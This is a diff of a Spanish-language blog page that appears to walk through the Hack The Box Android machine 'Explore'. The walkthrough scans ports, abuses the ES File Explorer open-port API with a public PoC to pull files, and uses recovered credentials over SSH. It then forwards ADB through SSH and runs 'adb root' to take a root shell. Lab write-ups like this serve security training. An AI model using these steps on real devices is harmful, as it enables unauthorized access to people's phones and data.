@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Explorer, la primera maquina android en HTB. Encontramos un puerto relacionado a ES File Explorer que expone una API que permite listar y descargar archivos del dispositivo, por donde descubrimos credenciales de acceso en una imagen. Para escalar privilegios utilizamos SSH para conectarnos con ADB a una shell privilegiada.">
   
 
-<meta name="generator" content="Hugo 0.92.0" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1602,16 +1602,16 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/android/" class="single__tag" title="android">android</a></li>
-  
-
   <li><a href="https://sckull.github.io/tags/adb/" class="single__tag" title="adb">adb</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/es-file-explorer/" class="single__tag" title="es file explorer">es file explorer</a></li>
+  <li><a href="https://sckull.github.io/tags/android/" class="single__tag" title="android">android</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/api/" class="single__tag" title="api">api</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/es-file-explorer/" class="single__tag" title="es file explorer">es file explorer</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/ssh/" class="single__tag" title="ssh">ssh</a></li>
@@ -1669,7 +1669,7 @@
     Matrix
   </span>
 </a></td>
-<td align="center"><div class="box"><pre tabindex="0"><code class="language-chart" data-lang="chart">{
+<td align="center"><div class="box"><pre><code class="language-chart" data-lang="chart">{
    &quot;type&quot;:&quot;radar&quot;,
    &quot;data&quot;:{
       &quot;labels&quot;:[&quot;Enumeration&quot;,&quot;Real-Life&quot;,&quot;CVE&quot;,&quot;Custom Explotation&quot;,&quot;CTF-Like&quot;],
@@ -1702,7 +1702,7 @@
 <p>Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (59777), ssh (2222), desconocido (38793).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1729,7 +1729,7 @@
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.91 scan initiated Sat Jul  3 03:26:05 2021 as: nmap -Pn -sV -sC -p2222,38793,59777 -oN scan_ports 10.10.10.247</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.91 scan initiated Sat Jul  3 03:26:05 2021 as: nmap -Pn -sV -sC -p2222,38793,59777 -oN scan_ports 10.10.10.247</span>
 Nmap scan report <span class="k">for</span> 10.10.10.247 <span class="o">(</span>10.10.10.247<span class="o">)</span>
 Host is up <span class="o">(</span>0.13s latency<span class="o">)</span>.
 
@@ -1760,7 +1760,7 @@ PORT      STATE SERVICE VERSION
 <p>En el puerto 59777 no encontramos ningun tipo de informacion.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1770,7 +1770,7 @@ PORT      STATE SERVICE VERSION
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> π ~/htb/explore ❯ curl -s http://10.10.10.247:59777/
+<pre class="chroma"><code class="language-bash" data-lang="bash"> π ~/htb/explore ❯ curl -s http://10.10.10.247:59777/
 FORBIDDEN: No directory listing.
  π ~/htb/explore ❯ curl -sI http://10.10.10.247:59777/
 HTTP/1.0 <span class="m">403</span> Forbidden
@@ -1784,7 +1784,7 @@ Date: Sat, <span class="m">3</span> Jul <span class="m">2021</span> 05:07:04 GMT
 <p>Tras ejecutar feroxbuster encontramos multiples directorios y archivos, algunos de estos nos indican que es de un dispositivo Android, entre estos vemos la flag <code>root</code> a la cual no tenemos acceso.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1829,7 +1829,7 @@ Date: Sat, <span class="m">3</span> Jul <span class="m">2021</span> 05:07:04 GMT
 </span><span class="lnt">43
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> π ~/htb/explore ❯ feroxbuster --url http://10.10.10.247:59777/ -w /usr/share/wordlists/dirb/big.txt -T <span class="m">10</span> -x txt,html,json,xml,php,htm,db,key
+<pre class="chroma"><code class="language-bash" data-lang="bash"> π ~/htb/explore ❯ feroxbuster --url http://10.10.10.247:59777/ -w /usr/share/wordlists/dirb/big.txt -T <span class="m">10</span> -x txt,html,json,xml,php,htm,db,key
 
  ___  ___  __   __     __      __         __   ___
 <span class="p">|</span>__  <span class="p">|</span>__  <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ <span class="p">|</span> <span class="p">|</span>  <span class="se">\ </span><span class="p">|</span>__
@@ -1881,7 +1881,7 @@ by Ben <span class="s2">&#34;epi&#34;</span> Risher 🤓                 ver: 2.
 <p>El PoC se encuentra en <a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln">Github - fs0c131y</a>, basicamente realiza distintas solicitudes en formato JSON con diferentes commandos para obtener informacion del dispositivo, listar y descargar archivos, fotos, videos, audios, etc.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1903,7 +1903,7 @@ by Ben <span class="s2">&#34;epi&#34;</span> Risher 🤓                 ver: 2.
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># curl --header &#34;Content-Type: application/json&#34; --request POST --data &#39;{&#34;command&#34;:&#34;[my_awesome_cmd]&#34;}&#39; http://192.168.0.8:59777</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># curl --header &#34;Content-Type: application/json&#34; --request POST --data &#39;{&#34;command&#34;:&#34;[my_awesome_cmd]&#34;}&#39; http://192.168.0.8:59777</span>
  π ESFileExplorerOpenPortVuln master ❯ python poc.py list 
 
 <span class="c1">######################</span>
@@ -1929,7 +1929,7 @@ getAppThumbnail: Get the icon of an app. Package name parameter is needed
 <p>Relizamos una enumeracion con los diferentes comandos, y encontramos imagenes las cuales descargamos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1940,7 +1940,7 @@ getAppThumbnail: Get the icon of an app. Package name parameter is needed
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">π ESFileExplorerOpenPortVuln master ❯ python poc.py --cmd listPics --host 10.10.10.247
+<pre class="chroma"><code class="language-bash" data-lang="bash">π ESFileExplorerOpenPortVuln master ❯ python poc.py --cmd listPics --host 10.10.10.247
 <span class="o">[</span>*<span class="o">]</span> Executing command: listPics on 10.10.10.247
 <span class="o">[</span>*<span class="o">]</span> Server responded with: <span class="m">200</span>
 
@@ -1955,17 +1955,17 @@ getAppThumbnail: Get the icon of an app. Package name parameter is needed
 <img src="/images/posts/htb/explore/Screenshot_20210703_012155.png" alt="image" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kristi:kr1st!5h@Rp3xPl0r3!
+<pre class="chroma"><code class="language-bash" data-lang="bash">kristi:kr1st!5h@Rp3xPl0r3!
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="shell">Shell</h2>
 <p>Utilizamos las credenciales en el servicio SSH en el puerto 2222 por donde logramos obtener acceso.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1974,7 +1974,7 @@ getAppThumbnail: Get the icon of an app. Package name parameter is needed
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> π ~/htb/explore ❯ ssh kristi@10.10.10.247 -p <span class="m">2222</span> <span class="c1"># Kr1sT!5h@Rp3xPl0r3!</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"> π ~/htb/explore ❯ ssh kristi@10.10.10.247 -p <span class="m">2222</span> <span class="c1"># Kr1sT!5h@Rp3xPl0r3!</span>
 Password authentication
 Password:
 :/ $ whoami<span class="p">;</span> id<span class="p">;</span> <span class="nb">pwd</span>
@@ -1986,7 +1986,7 @@ u0_a76
 </div><p>Enumerando los directorios encontramos la flag <code>user.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2010,7 +2010,7 @@ u0_a76
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">:/sdcard $ ls -lah
+<pre class="chroma"><code class="language-bash" data-lang="bash">:/sdcard $ ls -lah
 total 34K
 drwxrwx--- <span class="m">15</span> root everybody 4.0K 2021-04-21 02:12 .
 drwx--x--x  <span class="m">4</span> root everybody 4.0K 2021-03-13 17:16 ..
@@ -2038,7 +2038,7 @@ f32017174c7c7e8f50c6da52891ae250
 <p>Localmente encontramos el puerto 5555 que comunmente es utilizado por adb.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2049,7 +2049,7 @@ f32017174c7c7e8f50c6da52891ae250
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">:/sdcard $ netstat -ntpl
+<pre class="chroma"><code class="language-bash" data-lang="bash">:/sdcard $ netstat -ntpl
 Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name
 tcp6       <span class="m">0</span>      <span class="m">0</span> :::2222                 :::*                    LISTEN      3427/net.xnano.android.sshserver
@@ -2064,7 +2064,7 @@ tcp6       <span class="m">0</span>      <span class="m">0</span> :::59777      
 <p>Tras escanear el puerto aparece como filtrado y algunas veces como abierto, intentando una conexion con <code>adb</code> se muestra con tiempo de conexion agotado.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2077,13 +2077,13 @@ tcp6       <span class="m">0</span>      <span class="m">0</span> :::59777      
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># nmap 10.10.10.247 -p 5555</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># nmap 10.10.10.247 -p 5555</span>
 Nmap scan report <span class="k">for</span> 10.10.10.247 <span class="o">(</span>10.10.10.247<span class="o">)</span>
 Host is up <span class="o">(</span>0.071s latency<span class="o">)</span>.
 
 PORT     STATE    SERVICE
 5555/tcp filtered freeciv
-<span class="c1">#</span>
+#
  π ~/htb/explore ❯ adb connect 10.10.10.247:5555
 * daemon not running<span class="p">;</span> starting now at tcp:5037
 * daemon started successfully
@@ -2093,18 +2093,18 @@ failed to connect to <span class="s1">&#39;10.10.10.247:5555&#39;</span>: Connec
 </div><p>Utilizando SSH <a href="https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/adb-commands#port-tunneling">obtuvimos</a> el puerto 5555 localmente utilizando las credenciales anteriormente encontradas.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># give me port 5555</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># give me port 5555</span>
 ssh -L 5555:0.0.0.0:5555 kristi@10.10.10.247 -p <span class="m">2222</span> <span class="c1"># Kr1sT!5h@Rp3xPl0r3!</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Con <code>adb</code> nos conectamos con una shell con privilegios bajos para probar la conexion.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2123,7 +2123,7 @@ ssh -L 5555:0.0.0.0:5555 kristi@10.10.10.247 -p <span class="m">2222</span> <spa
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># check or kill server already started</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># check or kill server already started</span>
 <span class="c1"># connect to the port 5555</span>
  π ~/htb/explore ❯ adb kill-server
  π ~/htb/explore ❯ adb connect 127.0.0.1:5555
@@ -2146,7 +2146,7 @@ x86_64:/ $
 <p>Le &ldquo;dimos&rdquo; <a href="https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/adb-commands#system">permisos</a> root con adb al dispositivo y tras conectarnos obtuvimos una shell como root y con ello la flag <code>root.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2164,7 +2164,7 @@ x86_64:/ $
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> π ~/htb/explore ❯ adb -s emulator-5554 root
+<pre class="chroma"><code class="language-bash" data-lang="bash"> π ~/htb/explore ❯ adb -s emulator-5554 root
  π ~/htb/explore ❯ adb -s emulator-5554 shell
 x86_64:/ <span class="c1"># whoami</span>
 root
@@ -2179,7 +2179,7 @@ app-lib       drm           misc_ce    root.txt       user
 app-private   es_starter.sh misc_de    ss             user_de
 x86_64:/data <span class="c1"># cat root.txt</span>
 f04fc82b6d49b41c9b08982be59338c5
-x86_64:/data <span class="c1">#</span>
+x86_64:/data #
 </code></pre></td></tr></table>
 </div>
 </div>
@@ -2287,7 +2287,7 @@ x86_64:/data <span class="c1">#</span>
     </div>
     <div class="whoami__desc">
       
-        Pentester wannabe
+        CTF Player | RedTeamer &amp; Pentester wannabe
       
     </div>
     <div class="whoami__social">
@@ -2461,7 +2461,7 @@ x86_64:/data <span class="c1">#</span>
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
